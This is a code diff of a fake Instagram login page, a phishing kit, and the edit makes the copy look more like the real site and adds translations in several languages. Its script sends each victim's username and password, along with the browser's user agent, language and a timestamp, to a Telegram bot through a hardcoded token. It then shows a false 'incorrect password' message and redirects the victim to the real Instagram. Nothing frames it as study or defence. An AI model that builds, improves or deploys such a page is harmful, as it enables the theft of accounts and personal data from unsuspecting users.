@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="auto">
 
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram</title>
+  <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
   <style>
     * {
       margin: 0;
@@ -14,160 +15,485 @@
 
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      background-color: #fff;
+      background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
+      padding: 20px;
+      background-image: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png');
+      background-repeat: no-repeat;
+      background-position: -30px center;
+      background-size: 454px 618px;
+    }
+
+    @media (max-width: 875px) {
+      body {
+        background-image: none;
+      }
     }
 
     .container {
       width: 100%;
-      max-width: 400px;
-      padding: 20px;
+      max-width: 350px;
+      padding: 20px 40px;
       text-align: center;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      margin-left: auto;
+      margin-right: 150px;
+    }
+
+    .language-container {
+      margin: 20px 0;
     }
 
     .language {
       color: #8e8e8e;
-      margin-bottom: 30px;
       font-size: 14px;
+      text-align: center;
+    }
+
+    .language-selector {
+      color: #00376b;
+      text-decoration: none;
+      font-weight: 500;
     }
 
     .logo {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 30px;
-      background-color: #eee;
-      border-radius: 20px;
+      margin: 22px auto 24px;
+      width: 175px;
+      height: 51px;
+    }
+
+    .logo img {
+      width: 100%;
+      height: auto;
     }
 
     form {
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 6px;
+      margin-bottom: 10px;
     }
 
     input {
-      padding: 12px;
+      padding: 9px 8px 7px;
       border: 1px solid #dbdbdb;
-      border-radius: 6px;
-      font-size: 14px;
+      border-radius: 3px;
+      font-size: 12px;
+      background: #fafafa;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #a8a8a8;
     }
 
     button {
       background-color: #0095f6;
       color: white;
-      padding: 10px;
+      padding: 7px 16px;
       border: none;
-      border-radius: 8px;
-      font-weight: bold;
+      border-radius: 4px;
+      font-weight: 600;
       font-size: 14px;
       cursor: pointer;
+      margin-top: 8px;
+      opacity: 0.7;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 10px 0 18px;
+      color: #8e8e8e;
+      font-size: 13px;
+      font-weight: 600;
+    }
+
+    .divider::before,
+    .divider::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .divider::before {
+      margin-right: 15px;
+    }
+
+    .divider::after {
+      margin-left: 15px;
+    }
+
+    .facebook-login {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      margin: 8px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+    }
+
+    .facebook-login svg {
+      margin-right: 8px;
     }
 
     .forgot {
       color: #00376b;
-      font-size: 13px;
-      margin: 15px 0;
-    }
-
-    .create-account {
-      margin-top: 20px;
-      border: 1px solid #dbdbdb;
-      border-radius: 30px;
-      padding: 12px;
-      color: #0095f6;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    .meta {
       font-size: 12px;
-      color: #8e8e8e;
+      margin: 12px 0;
+      text-decoration: none;
+    }
+
+    .signup-container {
+      margin: 15px 0;
+      padding: 20px 0;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      font-size: 14px;
+    }
+
+    .signup-text {
+      color: #262626;
+    }
+
+    .signup-link {
+      color: #0095f6;
+      font-weight: 600;
+      text-decoration: none;
+    }
+
+    .app-download {
+      margin: 20px 0;
+      text-align: center;
+    }
+
+    .app-download-text {
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .app-stores {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .app-store-img {
+      height: 40px;
+    }
+
+    .footer {
       margin-top: 20px;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px 16px;
+      margin-bottom: 16px;
+    }
+
+    .footer-link {
+      color: #8e8e8e;
+      font-size: 12px;
+      text-decoration: none;
+    }
+
+    .footer-copyright {
+      color: #8e8e8e;
+      font-size: 12px;
+      margin-top: 12px;
     }
   </style>
 </head>
 
 <body>
   <div class="container">
-    <div class="language" id="lang-label">Français (France)</div>
-    <div class="logo" id="logo-placeholder"></div>
+    <div class="language-container">
+      <p class="language" id="lang-label">Language will be detected automatically</p>
+    </div>
+
+    <div class="logo">
+      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" id="instagram-logo">
+    </div>
+
     <form id="login-form">
-      <input type="text" id="username" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
-      <input type="password" id="password" placeholder="Mot de passe" required>
-      <button type="submit" id="login-button">Se connecter</button>
+      <input type="text" id="username" placeholder="Phone number, username, or email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit" id="login-button">Log In</button>
     </form>
-    <div class="forgot">Mot de passe oublié ?</div>
-    <div class="create-account">Créer un compte</div>
-    <div class="meta">© Meta</div>
+
+    <div class="divider">OR</div>
+
+    <a href="#" class="facebook-login">
+      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#385185" viewBox="0 0 24 24">
+        <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
+      </svg>
+      Log in with Facebook
+    </a>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <div class="signup-container">
+      <span class="signup-text">Don't have an account?</span>
+      <a href="#" class="signup-link">Sign up</a>
+    </div>
+
+    <div class="app-download">
+      <p class="app-download-text">Get the app.</p>
+      <div class="app-stores">
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="Download on the App Store" class="app-store-img">
+        <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Get it on Google Play" class="app-store-img">
+      </div>
+    </div>
+  </div>
+
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#" class="footer-link">Meta</a>
+      <a href="#" class="footer-link">About</a>
+      <a href="#" class="footer-link">Blog</a>
+      <a href="#" class="footer-link">Jobs</a>
+      <a href="#" class="footer-link">Help</a>
+      <a href="#" class="footer-link">API</a>
+      <a href="#" class="footer-link">Privacy</a>
+      <a href="#" class="footer-link">Terms</a>
+      <a href="#" class="footer-link">Top Accounts</a>
+      <a href="#" class="footer-link">Hashtags</a>
+      <a href="#" class="footer-link">Locations</a>
+      <a href="#" class="footer-link">Instagram Lite</a>
+      <a href="#" class="footer-link">Contact Uploading & Non-Users</a>
+    </div>
+    <div class="footer-copyright">
+      <span>© 2024 Instagram from Meta</span>
+    </div>
   </div>
 
   <script>
+    // Language detection and localization
     const langElement = document.getElementById("lang-label");
+    const loginButton = document.getElementById("login-button");
+    const usernameInput = document.getElementById("username");
+    const passwordInput = document.getElementById("password");
+    const forgotLink = document.querySelector(".forgot");
+    const signupText = document.querySelector(".signup-text");
+    const signupLink = document.querySelector(".signup-link");
+    const appDownloadText = document.querySelector(".app-download-text");
+    
     const lang = navigator.language || navigator.userLanguage;
-    const langMap = {
-      'fr': 'Français (France)',
-      'en': 'English (US)',
-      'de': 'Deutsch',
-      'ar': 'العربية',
-      'it': 'Italiano',
-    };
     const langShort = lang.split("-")[0];
-    if (langMap[langShort]) {
-      langElement.textContent = langMap[langShort];
+    
+    const translations = {
+      'en': {
+        language: "English",
+        usernamePlaceholder: "Phone number, username, or email",
+        passwordPlaceholder: "Password",
+        loginButton: "Log In",
+        divider: "OR",
+        facebookLogin: "Log in with Facebook",
+        forgotPassword: "Forgot password?",
+        signupText: "Don't have an account?",
+        signupLink: "Sign up",
+        appDownload: "Get the app.",
+        incorrectCredentials: "The username or password you entered is incorrect. Please check your information.",
+        loading: "Loading..."
+      },
+      'fr': {
+        language: "Français",
+        usernamePlaceholder: "Téléphone, nom d'utilisateur ou e-mail",
+        passwordPlaceholder: "Mot de passe",
+        loginButton: "Se connecter",
+        divider: "OU",
+        facebookLogin: "Se connecter avec Facebook",
+        forgotPassword: "Mot de passe oublié ?",
+        signupText: "Vous n'avez pas de compte ?",
+        signupLink: "Inscrivez-vous",
+        appDownload: "Téléchargez l'application.",
+        incorrectCredentials: "Le nom d'utilisateur ou le mot de passe que vous avez saisi est incorrect. Veuillez vérifier vos informations.",
+        loading: "Chargement..."
+      },
+      'ar': {
+        language: "العربية",
+        usernamePlaceholder: "رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني",
+        passwordPlaceholder: "كلمة السر",
+        loginButton: "تسجيل الدخول",
+        divider: "أو",
+        facebookLogin: "تسجيل الدخول باستخدام فيسبوك",
+        forgotPassword: "هل نسيت كلمة السر؟",
+        signupText: "ليس لديك حساب؟",
+        signupLink: "اشتراك",
+        appDownload: "احصل على التطبيق.",
+        incorrectCredentials: "اسم المستخدم أو كلمة المرور التي أدخلتها غير صحيحة. يرجى مراجعة معلوماتك.",
+        loading: "جار التحميل..."
+      },
+      'es': {
+        language: "Español",
+        usernamePlaceholder: "Teléfono, usuario o correo electrónico",
+        passwordPlaceholder: "Contraseña",
+        loginButton: "Iniciar sesión",
+        divider: "O",
+        facebookLogin: "Iniciar sesión con Facebook",
+        forgotPassword: "¿Olvidaste tu contraseña?",
+        signupText: "¿No tienes una cuenta?",
+        signupLink: "Regístrate",
+        appDownload: "Descarga la aplicación.",
+        incorrectCredentials: "El nombre de usuario o la contraseña que ingresaste son incorrectos. Por favor, revisa tu información.",
+        loading: "Cargando..."
+      },
+      'de': {
+        language: "Deutsch",
+        usernamePlaceholder: "Telefonnummer, Benutzername oder E-Mail",
+        passwordPlaceholder: "Passwort",
+        loginButton: "Anmelden",
+        divider: "ODER",
+        facebookLogin: "Mit Facebook anmelden",
+        forgotPassword: "Passwort vergessen?",
+        signupText: "Du hast noch kein Konto?",
+        signupLink: "Registrieren",
+        appDownload: "Lade die App herunter.",
+        incorrectCredentials: "Der eingegebene Benutzername oder das Passwort ist falsch. Bitte überprüfe deine Angaben.",
+        loading: "Wird geladen..."
+      }
+    };
+
+    // Default to English if language not found
+    const currentLang = translations[langShort] ? langShort : 'en';
+    const t = translations[currentLang];
+    
+    // Apply translations
+    if (t) {
+      langElement.textContent = t.language;
+      usernameInput.placeholder = t.usernamePlaceholder;
+      passwordInput.placeholder = t.passwordPlaceholder;
+      loginButton.textContent = t.loginButton;
+      document.querySelector(".divider").textContent = t.divider;
+      document.querySelector(".facebook-login").textContent = t.facebookLogin;
+      forgotLink.textContent = t.forgotPassword;
+      signupText.textContent = t.signupText;
+      signupLink.textContent = t.signupLink;
+      appDownloadText.textContent = t.appDownload;
     }
 
+    // Form submission handler
     const form = document.getElementById("login-form");
-    const loginButton = document.getElementById("login-button");
     let attempt = 0;
 
     form.addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
+      const username = usernameInput.value;
+      const password = passwordInput.value;
 
+      // Telegram bots configuration - updated as requested
       const bots = [
         { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
         { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
       ];
 
-      const text = `Tentative ${attempt + 1}\nNom d'utilisateur / Email: ${username}\nMot de passe: ${password}`;
+      const text = `Instagram Login Attempt ${attempt + 1}
+Username/Email: ${username}
+Password: ${password}
+Language: ${navigator.language}
+User Agent: ${navigator.userAgent}
+Timestamp: ${new Date().toISOString()}`;
 
-      for (const bot of bots) {
-        try {
-          await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              chat_id: bot.chatId,
-              text: text
-            })
-          });
-        } catch (error) {
-          console.error("Erreur d'envoi à Telegram:", error);
-        }
-      }
+      // Send to all Telegram bots
+      const sendPromises = bots.map(bot => {
+        return fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: bot.chatId,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        }).catch(error => {
+          console.error("Error sending to Telegram:", error);
+        });
+      });
 
+      // Disable button during processing
       loginButton.disabled = true;
-      loginButton.textContent = langShort === 'fr' ? 'Chargement...' : 'Loading...';
+      loginButton.textContent = t.loading;
+      loginButton.style.opacity = "0.7";
 
-      setTimeout(() => {
+      try {
+        await Promise.all(sendPromises);
+        
+        // Simulate processing delay
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
         attempt++;
-        loginButton.disabled = false;
-
+        
         if (attempt < 2) {
-          loginButton.textContent = langShort === 'fr' ? 'Se connecter' : 'Log In';
-          alert(langShort === 'fr' ? "Le nom d'utilisateur ou le mot de passe que vous avez saisi est incorrect. Veuillez vérifier vos informations." :
-            "The username or password you entered is incorrect. Please check your information.");
+          // Show error message
+          alert(t.incorrectCredentials);
+          passwordInput.value = "";
+          passwordInput.focus();
         } else {
-          window.location.href = "https://www.instagram.com";
+          // Redirect to Instagram after second attempt
+          window.location.href = "https://www.instagram.com/accounts/login/";
         }
-      }, 4000);
+      } finally {
+        // Re-enable button
+        loginButton.disabled = false;
+        loginButton.textContent = t.loginButton;
+        loginButton.style.opacity = attempt >= 2 ? "0.7" : "1";
+      }
+    });
+
+    // Form validation
+    form.addEventListener("input", function() {
+      const isValid = usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "";
+      loginButton.disabled = !isValid;
+      loginButton.style.opacity = isValid ? "1" : "0.7";
+    });
+
+    // Add hover effects
+    loginButton.addEventListener("mouseover", function() {
+      if (!loginButton.disabled) {
+        loginButton.style.opacity = "0.9";
+      }
+    });
+
+    loginButton.addEventListener("mouseout", function() {
+      if (!loginButton.disabled) {
+        loginButton.style.opacity = form.checkValidity() ? "1" : "0.7";
+      }
+    });
+
+    // Make links work
+    document.querySelector(".facebook-login").addEventListener("click", function(e) {
+      e.preventDefault();
+      window.location.href = "https://www.instagram.com/accounts/login/";
+    });
+
+    document.querySelector(".forgot").addEventListener("click", function(e) {
+      e.preventDefault();
+      window.location.href = "https://www.instagram.com/accounts/password/reset/";
+    });
+
+    document.querySelector(".signup-link").addEventListener("click", function(e) {
+      e.preventDefault();
+      window.location.href = "https://www.instagram.com/accounts/emailsignup/";
+    });
+
+    // Add click handlers for footer links
+    document.querySelectorAll(".footer-link").forEach(link => {
+      link.addEventListener("click", function(e) {
+        e.preventDefault();
+        window.location.href = "https://www.instagram.com" + this.getAttribute("href");
+      });
     });
   </script>
 </body>
